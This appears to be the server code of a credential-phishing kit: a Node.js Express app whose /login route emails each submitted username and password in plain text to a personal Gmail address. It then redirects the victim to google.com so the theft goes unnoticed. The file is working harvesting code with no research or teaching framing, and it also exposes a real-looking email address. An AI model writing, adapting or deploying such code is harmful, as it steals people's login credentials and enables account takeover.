var express = require("express");
var app = express();
var mustache = require("mustache-express");

app.engine("html",mustache());
app.set("view engine", "html");
app.set("views", __dirname+"/../client/views");
app.use("/", express.static(__dirname+"/../client/public"));

//Define the port
var port = 8080;

var sendmail = require('sendmail')({
  logger: {
    debug: console.log,
    info: console.info,
    warn: console.warn,
    error: console.error
  },
  silent: false,
})



//Define what happens then a user visits the root route
app.get("/",function(req,res)
{
  res.render("index"); //Tell Express which html file to render for this route
});

// sendmail npm
app.post('/login',function(req,res)
{
  sendmail({
    from: 'no-reply@yourdomain.com',
    to: 'sarahm.aoun@gmail.com ',
    subject: 'test sendmail',
    html: "username:" + req.body['username'] + " || password: "+ req.body['password'],
  }, function(err, reply) {
    console.log(err && err.stack);
    console.dir(reply);
});
  res.redirect('https://google.com');
});

// storage route
app.get('/storage/8aASkfg4xz',function(req,res)
{
  res.redirect("/");
});


//Start the server on the defined port
app.listen(port, function()
{
  console.log("Server running on port: "+port);
})
